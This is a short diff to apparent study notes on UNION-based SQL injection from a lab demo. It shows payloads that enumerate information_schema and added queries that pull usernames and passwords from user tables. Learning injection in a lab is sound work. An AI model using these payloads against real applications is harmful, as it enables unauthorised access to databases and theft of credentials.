@@ -89,6 +89,10 @@ Selection=2 UNION SELECT 1,2,3 ## Displayed 1,3,2
 ### 3.) Modify Golden Statement
 Selection=2 UNION SELECT table_schema,column_name,table_name from information_schema.columns
 
+### 4.) Craft Query
+Selection=2 UNION SELECT start,status,last_access from session.session_log (Got nun)
+Selection=2 UNION SELECT studentID,username,passwd from session.userinfo
+Selection=2 UNION SELECT id,name,pass from session.user
 #We will see the actual data stored in here.
 select username,passwd from session.userinfo
 ### Union.html demo
